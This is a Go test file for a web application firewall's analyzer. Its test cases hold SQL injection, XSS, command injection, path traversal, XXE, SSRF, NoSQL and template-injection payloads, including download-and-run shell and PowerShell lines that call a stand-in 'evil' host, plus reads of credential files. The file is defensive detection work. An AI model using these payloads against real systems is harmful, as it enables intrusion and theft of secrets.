package semantic

import (
	"bytes"
	"context"
	"mime/multipart"
	"net/http"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func TestAnalyzerReadinessMatrix(t *testing.T) {
	cases := []struct {
		name        string
		method      string
		target      string
		contentType string
		body        string
		header      map[string]string
		cookie      *http.Cookie
		category    string
	}{
		{name: "sqli-union-select", method: http.MethodGet, target: "/search?q=1%20union%20select%20password%20from%20users", category: "sqli"},
		{name: "sqli-obfuscated-comment-keywords", method: http.MethodGet, target: "/search?q=1%20un/**/ion%20sel/**/ect%201,2", category: "sqli"},
		{name: "sqli-time-blind", method: http.MethodPost, target: "/login", contentType: "application/x-www-form-urlencoded", body: "name=admin')waitfor%20delay'0:0:5'--", category: "sqli"},
		{name: "sqli-destructive", method: http.MethodPost, target: "/api", contentType: "application/json", body: `{"sort":"id; DROP TABLE users"}`, category: "sqli"},
		{name: "sqli-server-side-file-read", method: http.MethodPost, target: "/api", contentType: "application/x-www-form-urlencoded", body: "id=1 union select load_file('/etc/passwd')", category: "sqli"},
		{name: "sqli-extractvalue-error-based", method: http.MethodGet, target: "/search?q=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))", category: "sqli"},
		{name: "sqli-pg-sleep", method: http.MethodPost, target: "/login", contentType: "application/x-www-form-urlencoded", body: "u=admin'%3Bselect%20pg_sleep(5)--", category: "sqli"},
		{name: "sqli-char-concat-tautology", method: http.MethodGet, target: "/search?q=1%20or%20char(49)%3Dchar(49)", category: "sqli"},
		{name: "sqli-mysql-versioned-comment", method: http.MethodGet, target: "/search?q=1%20/*!50000UNION*/%20/*!50000SELECT*/%20password%20from%20users", category: "sqli"},
		{name: "sqli-hex-tautology", method: http.MethodGet, target: "/search?q=1%20or%200x31%3D0x31--", category: "sqli"},
		{name: "sqli-order-by-enumeration", method: http.MethodGet, target: "/search?q=1%20order%20by%203--", category: "sqli"},
		{name: "sqli-stacked-xp-cmdshell", method: http.MethodPost, target: "/api/report", contentType: "application/x-www-form-urlencoded", body: "id=1%3Bexec%20master..xp_cmdshell%20%27whoami%27--", category: "sqli"},
		{name: "sqli-into-outfile-webshell", method: http.MethodGet, target: "/search?q=1%20union%20select%20%27%3C%3Fphp%20system(%24_GET%5Bc%5D)%3B%3F%3E%27%20into%20outfile%20%27%2Fvar%2Fwww%2Fhtml%2Fs.php%27", category: "sqli"},
		{name: "xss-script", method: http.MethodGet, target: "/?q=%3Cscript%3Ealert(1)%3C/script%3E", category: "xss"},
		{name: "xss-unicode-escaped", method: http.MethodGet, target: `/profile?bio=\u003cimg src=x onerror=alert(1)\u003e`, category: "xss"},
		{name: "xss-nul-javascript-uri", method: http.MethodGet, target: "/?next=%3Ca%20href%3Djava%00script%3Aalert(1)%3Ego%3C%2Fa%3E", category: "xss"},
		{name: "xss-entity-event-handler", method: http.MethodGet, target: "/?q=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(1)%26gt%3B", category: "xss"},
		{name: "xss-data-html-uri", method: http.MethodGet, target: "/?next=%3Cobject%20data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3E", category: "xss"},
		{name: "xss-srcdoc-script", method: http.MethodGet, target: "/?frame=%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E", category: "xss"},
		{name: "xss-meta-refresh-javascript", method: http.MethodGet, target: "/?q=%3Cmeta%20http-equiv%3Drefresh%20content%3D%270%3Burl%3Djavascript%3Aalert(1)%27%3E", category: "xss"},
		{name: "xss-css-expression", method: http.MethodGet, target: "/?q=%3Cdiv%20style%3D%22width%3Aexpression(alert(1))%22%3E", category: "xss"},
		{name: "xss-formaction-javascript", method: http.MethodPost, target: "/comment", contentType: "application/x-www-form-urlencoded", body: "body=%3Cbutton%20formaction%3Djavascript%3Aalert(1)%3ESend%3C%2Fbutton%3E", category: "xss"},
		{name: "xss-srcset-javascript", method: http.MethodGet, target: "/?avatar=%3Cimg%20srcset%3D%22javascript%3Aalert(1)%201x%22%3E", category: "xss"},
		{name: "xss-cookie", method: http.MethodGet, target: "/checkout", cookie: &http.Cookie{Name: "return_to", Value: "%3Csvg%20onload%3Dalert(1)%3E"}, category: "xss"},
		{name: "rce-shell-chain", method: http.MethodGet, target: "/run?cmd=1%3Bcat%20/etc/passwd", category: "rce"},
		{name: "rce-download-pipe-shell", method: http.MethodPost, target: "/hook", contentType: "application/x-www-form-urlencoded", body: "cmd=wget http://evil/p.sh | sh", category: "rce"},
		{name: "rce-subshell", method: http.MethodGet, target: "/run?cmd=%24%28whoami%29", category: "rce"},
		{name: "rce-python-inline", method: http.MethodGet, target: "/run?cmd=python%20-c%20%22import%20os;os.system('id')%22", category: "rce"},
		{name: "rce-ifs-file-read", method: http.MethodGet, target: "/run?cmd=cat%24%7BIFS%7D/etc/passwd", category: "rce"},
		{name: "rce-cmd-c-whoami", method: http.MethodGet, target: "/run?cmd=cmd%20/c%20whoami", category: "rce"},
		{name: "rce-bash-c-inline", method: http.MethodPost, target: "/hook", contentType: "application/x-www-form-urlencoded", body: "command=bash%20-c%20%27id%27", category: "rce"},
		{name: "rce-powershell-downloadstring", method: http.MethodPost, target: "/hook", contentType: "application/x-www-form-urlencoded", body: "exec=powershell%20-NoP%20-W%20hidden%20-Command%20IEX(New-Object%20Net.WebClient).DownloadString('http://evil/p.ps1')", category: "rce"},
		{name: "rce-powershell-encoded", method: http.MethodPost, target: "/hook", contentType: "application/x-www-form-urlencoded", body: "payload=pwsh%20-EncodedCommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA", category: "rce"},
		{name: "lfi-traversal", method: http.MethodGet, target: "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", category: "lfi"},
		{name: "lfi-windows-backslash", method: http.MethodGet, target: `/download?file=..\..\windows\win.ini`, category: "lfi"},
		{name: "lfi-overlong-dot-slash", method: http.MethodGet, target: "/download?file=....//....//etc/passwd", category: "lfi"},
		{name: "lfi-wrapper", method: http.MethodGet, target: "/download?file=php://filter/convert.base64-encode/resource=index.php", category: "lfi"},
		{name: "lfi-env", method: http.MethodGet, target: "/download?file=.env", category: "lfi"},
		{name: "lfi-kubernetes-token", method: http.MethodGet, target: "/download?file=/var/run/secrets/kubernetes.io/serviceaccount/token", category: "lfi"},
		{name: "lfi-proc-self-environ", method: http.MethodGet, target: "/download?file=%2Fproc%2Fself%2Fenviron", category: "lfi"},
		{name: "xxe-external-file", method: http.MethodPost, target: "/xml", contentType: "application/xml", body: `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>`, category: "xxe"},
		{name: "ssrf-metadata", method: http.MethodGet, target: "/fetch?url=http://169.254.169.254/latest/meta-data", category: "ssrf"},
		{name: "ssrf-decimal-loopback", method: http.MethodGet, target: "/fetch?url=http://2130706433/admin", category: "ssrf"},
		{name: "ssrf-dotted-hex-loopback", method: http.MethodGet, target: "/fetch?url=http://0x7f.0x0.0x0.0x1/admin", category: "ssrf"},
		{name: "ssrf-dotted-octal-metadata", method: http.MethodGet, target: "/fetch?url=http://0251.0376.0251.0376/latest/meta-data", category: "ssrf"},
		{name: "ssrf-ipv6-loopback", method: http.MethodGet, target: "/fetch?url=http://[::1]/admin", category: "ssrf"},
		{name: "ssrf-ipv4-mapped-ipv6-loopback", method: http.MethodGet, target: "/fetch?url=http://[::ffff:127.0.0.1]/admin", category: "ssrf"},
		{name: "ssrf-file-scheme-fetch", method: http.MethodPost, target: "/fetch", contentType: "application/json", body: `{"url":"file:///etc/passwd"}`, category: "ssrf"},
		{name: "ssrf-alibaba-metadata", method: http.MethodGet, target: "/fetch?url=http://100.100.100.200/latest/meta-data", category: "ssrf"},
		{name: "ssrf-loopback-json", method: http.MethodPost, target: "/fetch", contentType: "application/json", body: `{"url":"http://127.0.0.1:2375/containers/json"}`, category: "ssrf"},
		{name: "nosqli-login-ne-operators", method: http.MethodPost, target: "/login", contentType: "application/json", body: `{"username":{"$ne":null},"password":{"$ne":null}}`, category: "nosqli"},
		{name: "nosqli-query-where-javascript", method: http.MethodPost, target: "/api/search", contentType: "application/json", body: `{"$where":"this.password && this.password.length > 0"}`, category: "nosqli"},
		{name: "nosqli-bracket-form-operators", method: http.MethodPost, target: "/login", contentType: "application/x-www-form-urlencoded", body: "username%5B%24ne%5D=admin&password%5B%24ne%5D=x", category: "nosqli"},
		{name: "nosqli-regex-auth-bypass", method: http.MethodPost, target: "/login", contentType: "application/json", body: `{"email":{"$regex":".*"},"password":{"$ne":""}}`, category: "nosqli"},
		{name: "nosqli-expr-operator", method: http.MethodPost, target: "/api/search", contentType: "application/json", body: `{"$expr":{"$eq":["$role","admin"]}}`, category: "nosqli"},
		{name: "nosqli-function-body", method: http.MethodPost, target: "/api/search", contentType: "application/json", body: `{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}`, category: "nosqli"},
		{name: "ssti-jinja-globals-popen", method: http.MethodPost, target: "/profile", contentType: "application/x-www-form-urlencoded", body: `display_name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, category: "ssti"},
		{name: "ssti-spring-runtime-exec", method: http.MethodGet, target: "/render?name=%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D", category: "ssti"},
		{name: "ssti-freemarker-execute", method: http.MethodPost, target: "/render", contentType: "application/json", body: `{"name":"${\"freemarker.template.utility.Execute\"?new()(\"id\")}"}`, category: "ssti"},
		{name: "ssti-twig-filter-callback", method: http.MethodPost, target: "/render", contentType: "application/x-www-form-urlencoded", body: "name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", category: "ssti"},
		{name: "ssti-erb-system", method: http.MethodPost, target: "/render", contentType: "application/x-www-form-urlencoded", body: "template=%3C%25%3D%20system('id')%20%25%3E", category: "ssti"},
		{name: "ssti-arithmetic-probe-name", method: http.MethodPost, target: "/profile", contentType: "application/x-www-form-urlencoded", body: "name=%7B%7B7*7%7D%7D", category: "ssti"},
		{name: "multipart-xss", method: http.MethodPost, target: "/upload", contentType: "multipart", body: "<xss onfocus=alert(1)>", category: "xss"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := readinessRequest(t, tc.method, tc.target, tc.contentType, tc.body)
			for key, value := range tc.header {
				req.Header.Set(key, value)
			}
			if tc.cookie != nil {
				req.AddCookie(tc.cookie)
			}
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewAnalyzer("block").Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if result == nil || !result.Detected || result.Category != tc.category {
				t.Fatalf("expected %s detection, got %+v", tc.category, result)
			}
		})
	}
}

func TestAnalyzerReadinessBenignMatrix(t *testing.T) {
	cases := []struct {
		name        string
		target      string
		contentType string
		body        string
	}{
		{name: "documentation-select-word", target: "/docs?q=selecting%20a%20theme%20from%20the%20menu"},
		{name: "zip-text", target: "/comment", contentType: "application/x-www-form-urlencoded", body: "note=The zip on my coat is stuck"},
		{name: "curl-documentation", target: "/docs", contentType: "application/json", body: `{"example":"Use curl https://example.com to fetch docs"}`},
		{name: "html-education", target: "/learn", contentType: "application/x-www-form-urlencoded", body: "lesson=HTML uses script tags in examples without execution context"},
		{name: "sql-function-documentation", target: "/docs", contentType: "application/json", body: `{"text":"The char() and concat() SQL functions are documented here without user input execution."}`},
		{name: "javascript-uri-documentation", target: "/docs", contentType: "application/json", body: `{"text":"This page explains why javascript: URLs are dangerous, but includes no tag attribute."}`},
		{name: "iframe-documentation", target: "/docs", contentType: "application/json", body: `{"text":"The iframe element is documented here as markup text, without srcdoc, data URLs, or event handlers."}`},
		{name: "iframe-markup-documentation", target: "/docs", contentType: "application/json", body: `{"text":"Example markup: <iframe src=\"https://example.com\"></iframe> shows embedding syntax."}`},
		{name: "data-uri-documentation", target: "/docs", contentType: "application/json", body: `{"text":"data:text/html examples are discussed as documentation, not embedded in an executable HTML attribute."}`},
		{name: "meta-refresh-documentation", target: "/docs", contentType: "application/json", body: `{"text":"Meta refresh and CSS expression() are legacy browser security topics described here without executable markup."}`},
		{name: "srcset-documentation", target: "/docs", contentType: "application/json", body: `{"text":"HTML documentation may mention srcset and javascript: URL abuse as separate topics without embedding markup."}`},
		{name: "powershell-defense-documentation", target: "/docs", contentType: "application/json", body: `{"text":"PowerShell EncodedCommand and cmd /c are documented here for defenders, without a command parameter or payload."}`},
		{name: "localhost-url-documentation", target: "/docs", contentType: "application/json", body: `{"text":"Development docs may mention http://127.0.0.1:8080 or http://[::1] as local examples without asking the server to fetch them."}`},
		{name: "mongodb-operator-documentation", target: "/docs", contentType: "application/json", body: `{"text":"MongoDB documentation can mention $ne, $regex, and $where operators without sending them as query structure."}`},
		{name: "mongodb-expression-documentation", target: "/docs", contentType: "application/json", body: `{"text":"MongoDB docs describe $expr, $function, function(){ return true; }, and aggregation operators for defenders."}`},
		{name: "ordinary-json-filter", target: "/api/search", contentType: "application/json", body: `{"filter":{"status":"open","priority":"high"},"query":"mongodb operator docs"}`},
		{name: "template-arithmetic-documentation", target: "/docs", contentType: "application/json", body: `{"text":"Template documentation may show {{ 7 * 7 }} as a harmless arithmetic example."}`},
		{name: "template-engine-documentation", target: "/docs", contentType: "application/json", body: `{"text":"This guide mentions Twig registerUndefinedFilterCallback and ERB system examples as escaped documentation."}`},
		{name: "template-markdown-content", target: "/cms", contentType: "application/json", body: `{"content":"Use {{ user.name }} in the email template body."}`},
		{name: "public-url", target: "/fetch?url=https://example.com/feed.xml"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := readinessRequest(t, http.MethodPost, tc.target, tc.contentType, tc.body)
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewAnalyzer("block").Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if result != nil {
				t.Fatalf("expected benign request to pass, got %+v", result)
			}
		})
	}
}

func BenchmarkAnalyzerReadinessCorpus(b *testing.B) {
	req := readinessRequest(b, http.MethodPost, "/api/search", "application/json", `{"q":"1 un/**/ion sel/**/ect password from users"}`)
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		b.Fatal(err)
	}
	analyzer := NewAnalyzer("block")
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		reqCtx.Metadata = map[string]any{}
		if _, err := analyzer.Detect(context.Background(), reqCtx); err != nil {
			b.Fatal(err)
		}
	}
}

func readinessRequest(tb testing.TB, method, target, contentType, body string) *http.Request {
	tb.Helper()
	if contentType == "multipart" {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		part, err := writer.CreateFormField("payload")
		if err != nil {
			tb.Fatal(err)
		}
		if _, err := part.Write([]byte(body)); err != nil {
			tb.Fatal(err)
		}
		if err := writer.Close(); err != nil {
			tb.Fatal(err)
		}
		req, _ := http.NewRequest(method, target, &buf)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		return req
	}
	req, _ := http.NewRequest(method, target, strings.NewReader(body))
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	return req
}
